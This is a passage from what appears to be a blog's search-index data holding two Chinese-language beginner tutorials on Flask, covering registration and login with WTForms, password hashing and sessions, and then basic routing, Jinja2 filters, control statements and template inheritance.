wtforms.StringField(validators=[Length(min=4,max=4,message=\"验证码格式错误!\")])\n    username = wtforms.StringField(validators=[Length(min=3,max=20,message=\"用户名格式错误!\")])\n    password = wtforms.StringField(validators=[Length(min=6,max=20,message=\"密码格式错误!\")])\n    password_confirm = wtforms.StringField(validators=[EqualTo(\"password\")])\n\n    # 自定义验证\n    #1、邮箱是否被注册\n    #2、验证码是否正确\n    def validate_email(self,filed):\n        email = filed.data\n        user = UserModel.query.filter_by(email=email).first()\n        if user:\n            raise wtforms.ValidationError(message=\"该邮箱已被注册!\")\n    def validate_captcha(self,filed):\n        captcha = filed.data\n        email = self.email.data\n        capthcha_model = EmailCaptchaModel.query.filter_by(email=email,captcha=captcha).first()\n        if not capthcha_model:\n            raise wtfroms.ValidationError(message=\"邮箱或验证码错误!\")\n        else:\n            # todo: 可以删掉captcha_model\n            db.session.delete(capthcha_model)\n            db.session.commit()\n\n最后的那个删除验证码的是为了减轻服务器负担，但它与数据库交互过多是不太好的，所以else那里可写可不写，当写else语句时，models.py中需要添加一个字段，如下所示\n# models.py\nfrom exts import  db\nfrom datetime import  datetime\n\nclass UserModel(db.Model):\n    __tablename__ &#x3D; &quot;user&quot;\n    id &#x3D; db.Column(db.Integer,primary_key&#x3D;True,autoincrement&#x3D;True)\n    username &#x3D; db.Column(db.String(100),nullable&#x3D;True)\n    password &#x3D; db.Column(db.String(100), nullable&#x3D;True)\n    email &#x3D; db.Column(db.String(100), nullable&#x3D;True,unique&#x3D;True)\n    join_time &#x3D; db.Column(db.DateTime, default&#x3D;datetime.now)\n\nclass EmailcaptchaModel(db.Model)\n    __table__ &#x3D; &quot;email_captcha&quot;\n    id &#x3D; db.Column(db.Integer, primary_key&#x3D;True, autoincrement&#x3D;True)\n    email &#x3D; db.Column(db.String(100), nullable&#x3D;False)\n    captcha &#x3D; db.Column(db.String(100),nullable&#x3D;False)\n    #used &#x3D; db.Column(db.Boolean,default&#x3D;False)\n\n\n这个used字段用来校验验证码是否被用过，如果用过则进行一个删除。然后接下来对于登录和注册界面的话，我们还需要进行一个参数的获取，即提交的内容，我们该如何获取呢，我们这里访问这个界面，需要渲染模板，我们还需要获取数据，因此这里考虑到使用GET方法和POST方法来进行区分，当使用GET方法时，那它就是对模板进行一个渲染，而当使用POST方法时，它则是为了获取数据，其具体内容如下所示\n#auth.py\nimport random\nfrom flask import Blueprint, render_template, request\nfrom .forms import RegisterForm\n\nbp = Blueprint(\"auth\",__name__,url_prefix=\"/auth\")\n\n@bp.route(\"/login\")\ndef login():\n    pass\n\n@bp.route(\"/register\",methods=['GET','POST'])\ndef register():\n    if request.method == 'GET':\n        return render_template(\"register.html\")\n    else:\n        form = RegisterForm(request.form)\n        if form.validate():\n            return \"success\"\n        else:\n            print(form.errors)\n            return \"fail\"\n\n其他文件的内容也简单列一下\n#app.py\nfrom flask import Flask\nimport config\nfrom exts import db\nfrom models import UserModel\nfrom blueprints.qa import bp as qa_bp\nfrom blueprints.auth import bp as auth_bp\nfrom flask_migrate import Migrate\n\n\napp = Flask(__name__)\n\n#绑定配置文件\napp.config.from_object(config)\n\n\ndb.init_app(app)\n\nmigrate = Migrate(app,db)\n\napp.register_blueprint(qa_bp)\napp.register_blueprint(auth_bp)\n\n@app.route('/')\ndef hello_world():  # put application's code here\n    return 'Hello World!'\n\n\nif __name__ == '__main__':\n    app.run()\n    \n#qa.py\nfrom flask import Blueprint\n\nbp = Blueprint(\"qa\",__name__,url_prefix=\"/\")\n\n@bp.route(\"/\")\ndef index():\n    pass\n\n而后运行程序，访问auth/register路由\n\n此时可以发现它是已经存在一个校验了，当我们输入的密码不是6-20位时，就会提示密码格式有误，其他亦是如此，不过这里我是没有写具体的验证码的那些发送及实现过程的，所以后续它还用到了验证码的表，由于这些比较繁琐，所以我直接将有关验证码的进行了删除。最终修改部分代码如下\n#forms.py\nimport wtforms\nfrom wtforms.validators import Email,Length,EqualTo\nfrom models import UserModel,EmailCaptchaModel\nfrom exts import db\n\nclass RegisterForm(wtforms.Form):\n    email = wtforms.StringField(validators=[Email(message=\"邮箱格式错误\")])\n    username = wtforms.StringField(validators=[Length(min=3,max=20,message=\"用户名格式错误!\")])\n    password = wtforms.StringField(validators=[Length(min=6,max=20,message=\"密码格式错误!\")])\n\n    # 自定义验证\n    #1、邮箱是否被注册\n    #2、验证码是否正确\n    def validate_email(self,filed):\n        email = filed.data\n        user = UserModel.query.filter_by(email=email).first()\n        if user:\n            raise wtforms.ValidationError(message=\"该邮箱已被注册!\")\n\n\n\n\n\n提交后\n\n接下来我们把他写入到数据库中即可，我们这里通过修改auth.py来实现，这里的话还有一个就是对密码进行了一个加密，因为明文的话容易造成用户隐私泄露。修改后的auth.py内容如下\n#auth.py\nfrom exts import db\nfrom flask import Blueprint, render_template, request,redirect,url_for\nfrom .forms import RegisterForm\nfrom models import UserModel\nfrom werkzeug.security import  generate_password_hash\n\nbp = Blueprint(\"auth\",__name__,url_prefix=\"/auth\")\n\n@bp.route(\"/login\")\ndef login():\n    return \"这是登录界面!\"\n\n@bp.route(\"/register\",methods=['GET','POST'])\ndef register():\n    if request.method == 'GET':\n        return render_template(\"register.html\")\n    else:\n        form = RegisterForm(request.form)\n        if form.validate():\n            email = form.email.data\n            username = form.username.data\n            password = form.password.data\n            user = UserModel(email=email,username=username,password=generate_password_hash(password))\n            db.session.add(user)\n            db.session.commit()\n            return redirect(url_for(\"auth.login\"))\n        else:\n            print(form.errors)\n            return redirect(url_for(\"auth.register\"))\n\n接下来去尝试进行一个注册\n\n然后进行注册，此时回显注册成功，再去Navicat中查看数据表\n\n成功注册。\n此时的注册界面就算完成\n登录界面渲染类似之前的注册界面，我们需要将顶部和尾部相同的部分，通过Jinjia2模板使用父模板的即可，只保存中间部分的。\n源码如下\n#login.html\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>登录&lt;/title>\n    &lt;link rel=\"shortcut icon\" href=\"images/camera.ico\">\n    &lt;link rel=\"stylesheet\" href=\"css/login.css\">\n    &lt;link rel=\"stylesheet\" href=\"css/footer.css\">\n    &lt;script type=\"text/javascript\" src=\"js/regist.js\">&lt;/script>\n\n&lt;/head>\n&lt;body>\n&lt;!--头部-->\n&lt;div id=\"header\">\n\n    &lt;!--头部中间信息-->\n    &lt;div class=\"h_center\">\n        &lt;img src=\"images/logo.png\" alt=\"\">\n        &lt;p>欢迎来到未命名图库：请先登录！&lt;/p>\n    &lt;/div>\n\n&lt;/div>\n\n\n&lt;!--中部-->\n&lt;div id=\"login_body\">\n    &lt;div class=\"login_b_center\">\n        &lt;div class=\"login_bg\">\n            &lt;h1>密码登录&lt;/h1>\n            &lt;form action=\"#\" id=\"login\">\n                \n&lt;!--                //用户名-->\n                &lt;div class=\"userName\">\n                    &lt;span>&lt;/span>&lt;input type=\"text\">\n                &lt;/div>\n&lt;!--                //密码-->\n                &lt;div class=\"password\">\n                    &lt;span>&lt;/span>&lt;input type=\"password\">\n                &lt;/div>\n&lt;!--                //登录按钮-->\n                &lt;div class=\"login_btn\">\n                    &lt;a href=\"index.html\">\n                         &lt;input type=\"button\" value=\"登录\">\n                    &lt;/a>\n                    &lt;td colspan=\"2\" align=\"center\">&lt;button id=\"reset\" value=\"重置\" onclick=\"remove()\">取消&lt;/button>&lt;/td>\n\n                &lt;/div>\n\n                &lt;div class=\"forgot_password\">\n                    &lt;a href=\"\">忘记密码&lt;/a>\n                    &lt;a href=\"regist.html\">注册账号&lt;/a>\n                    &lt;a href=\"regist.html\">帮助&lt;/a>\n                &lt;/div>\n\n\n\n\n            &lt;/form>\n        &lt;/div>\n    &lt;/div>\n&lt;/div>\n\n&lt;!--尾部-->\n&lt;div id=\"footer\">\n    &lt;div class=\"link\">\n        &lt;a href=\"\">关于我们&lt;/a>\n        |\n        &lt;a href=\"\">联系我们&lt;/a>\n        |\n        &lt;a href=\"\">商家入驻&lt;/a>\n        |\n        &lt;a href=\"\">友情链接&lt;/a>\n        |\n    &lt;/div>\n    &lt;div class=\"copyright\">\n        Copyright © 1999 - 2020 LZH. All Rights Reserved.\n    &lt;/div>\n&lt;/div>\n&lt;/body>\n&lt;/html>\n\n\n\n改动后如下\n&#123;% extends \"base.html\" %&#125;\n\n&#123;% block title %&#125;登录界面&#123;% endblock %&#125;\n\n&#123;% block head %&#125;\n&lt;link rel=\"stylesheet\" href=\"&#123;&#123; url_for('static',filename='css/login.css') &#125;&#125;\">\n&lt;link rel=\"stylesheet\" href=\"&#123;&#123; url_for('static',filename='css/footer.css') &#125;&#125;\">\n&#123;% endblock %&#125;\n&#123;% block body %&#125;\n&lt;!--头部-->\n&lt;div id=\"header\">\n\n    &lt;!--头部中间信息-->\n    &lt;div class=\"h_center\">\n        &lt;img src=\"&#123;&#123; url_for('static',filename='images/logo.png') &#125;&#125;\" alt=\"\">\n        &lt;p>欢迎来到未命名图库：请先登录！&lt;/p>\n    &lt;/div>\n\n&lt;/div>\n&lt;!--中部-->\n&lt;div id=\"login_body\">\n    &lt;div class=\"login_b_center\">\n        &lt;div class=\"login_bg\">\n            &lt;h1>密码登录&lt;/h1>\n            &lt;form action=\"#\" id=\"login\">\n\n&lt;!--                //用户名-->\n                &lt;div class=\"userName\">\n                    &lt;span>&lt;/span>&lt;input type=\"text\">\n                &lt;/div>\n&lt;!--                //密码-->\n                &lt;div class=\"password\">\n                    &lt;span>&lt;/span>&lt;input type=\"password\">\n                &lt;/div>\n&lt;!--                //登录按钮-->\n                &lt;div class=\"login_btn\">\n                    &lt;a href=\"index.html\">\n                         &lt;input type=\"button\" value=\"登录\">\n                    &lt;/a>\n                    &lt;td colspan=\"2\" align=\"center\">&lt;button id=\"reset\" value=\"重置\" onclick=\"remove()\">取消&lt;/button>&lt;/td>\n\n                &lt;/div>\n\n                &lt;div class=\"forgot_password\">\n                    &lt;a href=\"\">忘记密码&lt;/a>\n                    &lt;a href=\"regist.html\">注册账号&lt;/a>\n                    &lt;a href=\"regist.html\">帮助&lt;/a>\n                &lt;/div>\n\n\n\n\n            &lt;/form>\n        &lt;/div>\n    &lt;/div>\n&lt;/div>\n&#123;% endblock %&#125;\n\n而后我们再更改一下auth.py中注册成功的那个代码，让他跳转到登录界面\n\n具体代码如下\n#auth.py\nfrom exts import db\nfrom flask import Blueprint, render_template, request,redirect,url_for\nfrom .forms import RegisterForm\nfrom models import UserModel\nfrom werkzeug.security import  generate_password_hash\n\nbp = Blueprint(\"auth\",__name__,url_prefix=\"/auth\")\n\n@bp.route(\"/login\")\ndef login():\n    return render_template(\"login.html\")\n\n@bp.route(\"/register\",methods=['GET','POST'])\ndef register():\n    if request.method == 'GET':\n        return render_template(\"register.html\")\n    else:\n        form = RegisterForm(request.form)\n        if form.validate():\n            email = form.email.data\n            username = form.username.data\n            password = form.password.data\n            user = UserModel(email=email,username=username,password=generate_password_hash(password))\n            db.session.add(user)\n            db.session.commit()\n            return redirect(url_for(\"auth.login\"))\n        else:\n            print(form.errors)\n            return redirect(url_for(\"auth.register\"))\n\n\n此时注册完成后，可以发现直接跳转到了登录界面\n登录界面验证这个的话，我们需要验证账号密码,所以首先我们需要在forms.py写入校验用户和密码格式的，具体内容如下\nimport wtforms\nfrom wtforms.validators import Email,Length,EqualTo\nfrom models import UserModel,EmailCaptchaModel\nfrom exts import db\n\nclass RegisterForm(wtforms.Form):\n    email = wtforms.StringField(validators=[Email(message=\"邮箱格式错误\")])\n    username = wtforms.StringField(validators=[Length(min=3,max=20,message=\"用户名格式错误!\")])\n    password = wtforms.StringField(validators=[Length(min=6,max=20,message=\"密码格式错误!\")])\n\n    # 自定义验证\n    #1、邮箱是否被注册\n    #2、验证码是否正确\n    def validate_email(self,filed):\n        email = filed.data\n        user = UserModel.query.filter_by(email=email).first()\n        if user:\n            raise wtforms.ValidationError(message=\"该邮箱已被注册!\")\n\nclass  Loginform(wtforms.Form):\n    username = wtforms.StringField(validators=[Length(min=3,max=20,message=\"用户名格式错误!\")])\n    password = wtforms.StringField(validators=[Length(min=6,max=20,message=\"密码格式错误!\")])\n\n\n\n\n接下来去写这个auth.py登录界面，我们如何判断登录成功，即通过在数据库中查询是否存在此账号，然后校验密码的方式，如果成功登录，则让它跳转到/目录下，如何看它是否处于一个登录状态呢，这里就要用到Session了，设置session的话，我们是需要有一个SECRET_KEY的，在config.py中进行填写即可，如下图，瞎写就行。\n\n具体auth.py内容如下\nfrom exts import db\nfrom flask import Blueprint, render_template, request,redirect,url_for,session\nfrom .forms import RegisterForm,Loginform\nfrom models import UserModel\nfrom werkzeug.security import  generate_password_hash,check_password_hash\n\nbp = Blueprint(\"auth\",__name__,url_prefix=\"/auth\")\n\n@bp.route(\"/login\",methods=['GET','POST'])\ndef login():\n    if request.method == 'GET':\n        return render_template(\"login.html\")\n    else:\n        form = Loginform(request.form)\n        if form.validate():\n            username = form.username.data\n            password = form.password.data\n            user = UserModel.query.filter_by(username=username).first()\n            if not user:\n                print(\"用户在数据库中不存在!\")\n                return redirect(url_for(\"auth.login\"))\n            if check_password_hash(user.password,password):\n                #cookie:\n                # Cookie中不适合存储太多数据，只适合存储少量数据\n                # cookie一般用来存放登录授权的东西\n                # flask中的session，是经过加密后存储在cookie中的\n                session['user_id'] = user.id\n                return redirect(\"/\")\n                pass\n            else:\n                print(\"密码错误!\")\n                return redirect(url_for(\"auth.login\"))\n        else:\n            print(form.errors)\n            return redirect(url_for(\"auth.login\"))\n@bp.route(\"/register\",methods=['GET','POST'])\ndef register():\n    if request.method == 'GET':\n        return render_template(\"register.html\")\n    else:\n        form = RegisterForm(request.form)\n        if form.validate():\n            email = form.email.data\n            username = form.username.data\n            password = form.password.data\n            user = UserModel(email=email,username=username,password=generate_password_hash(password))\n            db.session.add(user)\n            db.session.commit()\n            return redirect(url_for(\"auth.login\"))\n        else:\n            print(form.errors)\n            return redirect(url_for(\"auth.register\"))\n\n\n同时qa.py是我们的根目录，所以需要对它进行简单设置，让它返回一个值即可\nfrom flask import Blueprint\n\nbp = Blueprint(\"qa\",__name__,url_prefix=\"/\")\n\n@bp.route(\"/\")\ndef index():\n    return  \"这是首页!\"\n\n\n接下来去登录，但我发现这个登录模板TMD有问题，怎么提交都是GET，所以进行了简单修改，如下所示\n&#123;% extends \"base.html\" %&#125;\n\n&#123;% block title %&#125;登录界面&#123;% endblock %&#125;\n\n&#123;% block head %&#125;\n&lt;link rel=\"stylesheet\" href=\"&#123;&#123; url_for('static',filename='css/login.css') &#125;&#125;\">\n&lt;link rel=\"stylesheet\" href=\"&#123;&#123; url_for('static',filename='css/footer.css') &#125;&#125;\">\n&#123;% endblock %&#125;\n&#123;% block body %&#125;\n&lt;!--头部-->\n&lt;div id=\"header\">\n\n    &lt;!--头部中间信息-->\n    &lt;div class=\"h_center\">\n        &lt;img src=\"&#123;&#123; url_for('static',filename='images/logo.png') &#125;&#125;\" alt=\"\">\n        &lt;p>欢迎来到未命名图库：请先登录！&lt;/p>\n    &lt;/div>\n\n&lt;/div>\n&lt;!--中部-->\n&lt;div id=\"login_body\">\n    &lt;div class=\"login_b_center\">\n        &lt;div class=\"login_bg\">\n            &lt;h1>密码登录&lt;/h1>\n            &lt;form  method=\"post\" id=\"login\">\n            &lt;form method=\"post\">\n            &lt;!--input输入框标签，默认为text，文本框\n                name：为该输入框起一个名字，用来提交数据\n            -->\n                &lt;p>用户名：&lt;input type=\"text\" name=\"username\"/>&lt;/p>\n            &lt;!--密码框input type=\"password\"，密码框输入字符会显示为小圆点-->\n                &lt;p>密码：&lt;input type=\"password\" name=\"password\"/>&lt;/p>\n            &lt;!--submit提交\n                reset重置所有输入框\n            -->\n                &lt;p>&lt;input type=\"submit\"/>\n                &lt;input type=\"reset\"/>&lt;/p>\n            &lt;/form>\n        &lt;/div>\n    &lt;/div>\n&lt;/div>\n&#123;% endblock %&#125;\n\n接下来去尝试登录\n\n可以发现此时是没有Cookie的\n登录后如下图\n\n成功得到Session\n钩子函数在执行某个指令前，我们可以进行中间操作，比如一个人要去一个地方，这个人中间被进行了拦截，我们这个钩子函数就相当于此时的这个拦截作用。\n比如我们在进行操作前想获取用户id，此时我们就可以去拦截一下然后获取用户id，将它放入某个变量中直接进行调用，而不需要再去数据库中进行查看，这样相比是比较方便的。常见的方法有before_request和after_request等。\n同时，我们发现在登录后，点击每个界面，这种用户信息都是存在的，即用户名都在右上角写着，正常思路的话是每次都需要单独对这个渲染一次，而实际上我们其实是把它当成一个变量，每次访问都会把它置于上下文中，例如\n@app.context_processor\ndef my_context_processor():\n    return &#123;\"user\": g.user&#125;\n\n非登录对于这个，我们只需要写一个销毁session的，即可实现。\n@bp.route(\"/logout\")\ndef logout():\n    session.clear()\n    return redirect(\"/\")\n\n\n但这个是视图中的，我们在实际html代码中还需要有一个指向，比如现在有退出按钮，我们需要修改它的href=&#123;&#123;url_for('auth.logout')&#125;&#125;。\n","slug":"Flask从0到0.1 part-02","date":"2023-03-16T19:11:20.000Z","categories_index":"WEB知识","tags_index":"FLask","author_index":"quan9i"},{"id":"d70f7939ae7e6d64d51d92d64d7620bd","title":"Flask 从0到0.1 part-01","content":"Flask环境搭建 Pycharm+Flask，具体流程如下，打开Pycharm\n\n记得选下面这个Previously configured interpreter选项，上面那个是新建环境，而这个是自己C盘的环境，上面那个容易出现报错。\n然后接下来可以发现有两个文件夹+一个文件，app.py是主入口文件，static是静态文件夹，templates是模板文件夹\n其app.py内代码具体作用如下（而后点击右上角的小绿三角进行运行）\n\n可以发现下方的URL，访问即可\n\n部分配置debug配置说一下为什么要配置这个\n当我们运行一个程序\n\n此时已经运行起来了，比如我们想更换返回内容为Welcome quan9i&#39;s blog ，但我们修改过后打开浏览器会发现是没有变化的，这是因为没有开启debug模式，这个时候我们如果想在浏览器上看到效果，我们还需要重新关闭再开启，这个相对是比较麻烦的，而当我们开启debug模式后，我们则可以直接修改，而后在浏览器查看变化。\n如何开启debug模式呢，关闭程序运行，而后点击右上角\n\n\n此时勾选完FLASK_DEBUG点击Apply，如何点击ok即可，此时再来运行\n\n将内容修改为Welcome quan9i，此时打开浏览器查看\n\nhost配置修改这个的作用是为了使其他电脑能访问到自身电脑的FLask项目。\n如何配置呢，与刚刚类似，右上角打开编辑\n\n在这里添加一个--host=0.0.0.0即可\n配置端口默认为5000端口，当5000端口被占用，想进行更换时，可以和刚刚host相似，在同一处加上--port =8088，即可配置为8088端口\n\n此时再运行文件\n\n端口从5000变成了8088端口\nURL与视图我们可以自行定义新的路由，比如像这样\n@app.route('/quan9i')\ndef quan9i():\n    return \"我是quan9i\"\n\n@app.route('/blog')\ndef blog():\n    return \"Welcome my blog\"\n\n接下来运行访问查看效果\n\n那么我们如何写入有参数的路由呢，这里举个例子，示例如下\n@app.route('/blog/&lt;blog_id>') #&lt;blog_id>可以改为&lt;int:blog_id>或&lt;string:blog_id>，这个的话其实就是一个数据强制转换\ndef blog_detail(blog_id):\n    return \"您访问的是博客的第%s篇文章\" % blog_id\n\n接下来尝试去进行访问\n但这个相对来说不是很灵活，还有一种方式，是采用request.args的方法来写一个有参数的路由，具体示例如下\n@app.route('/book/list')\ndef book_list():\n    #request.args: 类字典类型\n    page = request.args.get(\"page\",default=1,type=int)#default是默认值，不填参数则默认值为1\n    return f\"您获取的是第&#123;page&#125;页的图书列表\n    #f是将当前环境中的变量直接放入花括号中进行使用\n\n这个的话需要我们去导入request 模块，然后我们去访问\n\n接下来传值\n\nJinja2模板渲染点击template中的html\n\n接下来命名为index.html，随便编写一下内容\n\n那我们这里该如何进行使用呢，这里需要调用一个模块，即render_template模块，然后简单修改代码即可，具体如下\nfrom flask import Flask,render_template #从Flask包中调用flask\n\n\napp = Flask(__name__)\n#使用Flask类创建一个app对象\n#__name__:代表当前app.py这个模块\n#作用1：以后出现bug，他可以帮助我们快速定位\n#作用2：对于寻找模板文件，有一个绝对路径\n\n#创建一个路由和视图函数的映射\n@app.route('/')\n#定义跟路由\ndef hello_world():  # put application's code here\n    return render_template(\"index.html\")\n\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n此时运行程序，访问网页\n那么如何对有参数的文件进行一个模板渲染呢，与此类似，这里简单说一下，首先在template文件夹下新建html文件，然后我们这里假设变量是blog_id，Jinjia2模板引用变量的方式是&#123;&#123;变量名&#125;&#125;，所以我们这里这样写即可\n\n而后我们的主文件app.py这样写\nfrom flask import Flask,render_template #从Flask包中调用flask\n\n\napp = Flask(__name__)\n#使用Flask类创建一个app对象\n#__name__:代表当前app.py这个模块\n#作用1：以后出现bug，他可以帮助我们快速定位\n#作用2：对于寻找模板文件，有一个绝对路径\n\n#创建一个路由和视图函数的映射\n@app.route('/')\n#定义跟路由\ndef hello_world():  # put application's code here\n    return render_template(\"index.html\")\n@app.route('/blog/&lt;blog_id>')\ndef blog_detail(blog_id):\n    return render_template(\"blog_detail.html\",blog_id=blog_id)\n\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n此时去访问界面并附加参数\n\n模板访问对象属性模板该如何访问对象的属性呢，我们这里以一个例子来进行相关讲解。\n主入口文件app.py具体代码如下\nfrom flask import Flask,render_template #从Flask包中调用flask\n\n\napp = Flask(__name__)\n\nclass User:\n    def __init__(self,username,email):\n        self.username = username\n        self.email = email\n\n@app.route('/')\ndef hello_world():\n    user = User(username=\"quan9i\",email=\"qwq@qq.com\")\n    person = &#123;\n        \"username\" : \"赵四\",\n        \"email\":\"zhaosi@qq.com\"\n    &#125;\n    return  render_template(\"index.html\",user=user,person=person)\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n可以看到这里是定义了一个User对象，其中含有username和email属性，同时呢，我们这里也采用字典的方式，写入一个person参数，其中也包含这两个属性，接下来如何访问呢，在Jinjia2模板中，字典可以通过字典名[属性]来访问，也可以这样访问字典名.属性，我们的index.html文件内容如下\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>quan9i's blog&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h1>欢迎来到博客首页&lt;/h1>\n&lt;div>&#123;&#123; user.username &#125;&#125;/&#123;&#123; user.email &#125;&#125;&lt;/div>\n&lt;div>&#123;&#123; person['username'] &#125;&#125;/&#123;&#123; person.email &#125;&#125;&lt;/div>\n&lt;/body>\n&lt;/html>\n\n接下来执行程序，访问界面，可以看到这两个是都可以的。\n\n过滤器使用常见的过滤器如下\nabs(value)：返回一个数值的绝对值。示例：-1|abs\n\ndefault(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(‘xiaotuo’)——如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。\n\nescape(value)或e：转义字符，会将&lt;、>等符号转义成HTML中的符号。显例：content|escape或content|e。\n\nfirst(value)：返回一个序列的第一个元素。示例：names|first\n\nformat(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; \"%s\" - \"%s\"|format('Hello?',\"Foo!\") &#125;&#125;将输出：Helloo? - Foo!\n\nlast(value)：返回一个序列的最后一个元素。示例：names|last。\n\nlength(value)：返回一个序列或者字典的长度。示例：names|length。\n\njoin(value,d=u”)：将一个序列用d这个参数的值拼接成字符串。\n\nsafe(value)：如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例：content_html|safe。\n\nint(value)：将值转换为int类型。\n\nfloat(value)：将值转换为float类型。\n\nlower(value)：将字符串转换为小写。\n\nupper(value)：将字符串转换为小写。\n\nreplace(value,old,new)： 替换将old替换为new的字符串。\n\ntruncate(value,length=255,killwords=False)：截取length长度的字符串。\n\nstriptags(value)：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格。\n\ntrim：截取字符串前面和后面的空白字符。\n\nstring(value)：将变量转换成字符串。\n\nwordcount(s)：计算一个长字符串中单词的个数。\n\n\n那么如何进行使用呢，具体如下所示，向这些内置的，即Python自带的，我们直接使用管道符|加上过滤器名即可使用，我们这里的index.html代码如下\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>quan9i's blog&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h1>欢迎来到博客首页&lt;/h1>\n&lt;div>&#123;&#123; user.username &#125;&#125;————&#123;&#123; user.username|length &#125;&#125;&lt;/div>\n&lt;/body>\n&lt;/html>\n\n接下来访问界面\n\n可以看到返回了6，对应的是quan9i的长度，接下来说一下如何自定义过滤器。其实自定义一个函数，如何再简单设置一下即可，具体app.py代码如下\nfrom flask import Flask,render_template #从Flask包中调用flask\nfrom datetime import datetime\n\napp = Flask(__name__)\n\n\ndef datetime_format(value,format=\"%Y年-%m月-%d日 %H:%H\"):\n    return value.strftime(format)\n\napp.add_template_filter(datetime_format,\"dformat\")#增添一个自定义函数作为过滤器，并命名为dformat\n\n\n\nclass User:\n    def __init__(self,username,email):\n        self.username = username\n        self.email = email\n\n@app.route('/')\ndef hello_world():\n    user = User(username=\"quan9i\",email=\"qwq@qq.com\")\n    mytime = datetime.now()\n    return  render_template(\"index.html\",user=user,mytime=mytime)\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n此时再设置一下index.html,具体内容如下\n\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>quan9i's blog&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h1>欢迎来到博客首页&lt;/h1>\n&lt;div>&#123;&#123; user.username &#125;&#125;————&#123;&#123; user.username|length &#125;&#125;&lt;/div>\n&lt;div>&#123;&#123; mytime|dformat &#125;&#125;&lt;/div>\n&lt;/body>\n&lt;/html>\n\n此时访问界面\n\n可以发现自定义过滤器已生效，格式就是我们刚刚设置的那种，年月日的形式。\n控制语句控制语句，常见的是if和for，而在Jinja2中，写语句的话需要注意格式是&#123;% xx %&#125;，同时需要写上end进行闭合，比如if`语句就是\n&#123;% if xxx %&#125;\n....\n&#123;% endif %&#125;\n\n对for语句就是\n&#123;% for xxx in xxx %&#125;\n...\n&#123;% endfor %&#125;\n\n接下来举个例子，我们这里的入口文件app.py内容如下\nfrom flask import Flask,render_template #从Flask包中调用flask\n\napp = Flask(__name__)\n\n\n\n\nclass User:\n    def __init__(self,username,email):\n        self.username = username\n        self.email = email\n\n@app.route('/')\ndef hello_world():\n    age = 17\n    books = [&#123;\n        \"name\":\"三国演义\",\n        \"author\":\"罗贯中\"\n    &#125;,&#123;\n        \"name\":\"水浒传\",\n        \"author\":\"施耐庵\"\n    &#125;]\n    return  render_template(\"control.html\",age=age,books=books)\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n我们的control.html内容如下\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>控制语句demo&lt;/title>\n&lt;/head>\n&lt;body>\n&#123;%  if age>18 %&#125;\n&lt;div>您已经满18岁，可以进入网吧&lt;/div>\n&#123;% elif age==18 %&#125;\n&lt;div>您刚满18岁，需要父母陪同进入网吧&lt;/div>\n&#123;% else %&#125;\n&lt;div>您未满18岁，不能进入网吧&lt;/div>\n&#123;% endif %&#125;\n\n&#123;% for book in books %&#125;\n    &lt;div>图书名称:&#123;&#123; book.name &#125;&#125;,图书作者:&#123;&#123; book.author &#125;&#125;&lt;/div>\n&#123;% endfor %&#125;\n\n&lt;/body>\n&lt;/html>\n\n此时访问界面\n\n模板继承一些模块，比如导航栏和底部信息是常用的，如果每次都去写，是比较麻烦的。\n对于这个的实现，我们这里以代码为例，主入口文件app.py内容如下\nfrom flask import Flask,render_template #从Flask包中调用flask\n\napp = Flask(__name__)\n\n\n\n\n@app.route('/')\ndef hello_world():\n    age = 17\n    books = [&#123;\n        \"name\":\"三国演义\",\n        \"author\":\"罗贯中\"\n    &#125;,&#123;\n        \"name\":\"水浒传\",\n        \"author\":\"施耐庵\"\n    &#125;]\n    return  render_template(\"control.html\",age=age,books=books)\n\n@app.route('/child')\ndef child():\n    return render_template(\"child.html\")\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n我们的父模板base.html内容如下\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>父模板&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h1>我是父模板的文字&lt;/h1>\n&lt;/body>\n&lt;/html>\n\n我们的子模板child.html内容如下\n&lt;% extends \"base.html\"%>\n\n而后可以看到我们主入口文件中是用的child.html，接下来去访问界面\n\n此时发现是复刻了父模板，但实际情况不可能要求一模一样，我们如何进行更改呢，这里仍然以代码为例\n主文件入口app.py内容如下\nfrom flask import Flask,render_template #从Flask包中调用flask\n\napp = Flask(__name__)\n\n\n\n\n@app.route('/')\ndef hello_world():\n    age = 17\n    books = [&#123;\n        \"name\":\"三国演义\",\n        \"author\":\"罗贯中\"\n    &#125;,&#123;\n        \"name\":\"水浒传\",\n        \"author\":\"施耐庵\"\n    &#125;]\n    return  render_template(\"control.html\",age=age,books=books)\n\n@app.route('/child')\ndef child():\n    return render_template(\"child.html\")\n\n@app.route('/child2')\ndef child2():\n    return render_template(\"child2.html\")\nif __name__ == '__main__': #如果当前文件为主入口，就会往下运行\n    app.run()\n\n\n父模板base.html内容为\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>&#123;% block title %&#125;&#123;% endblock 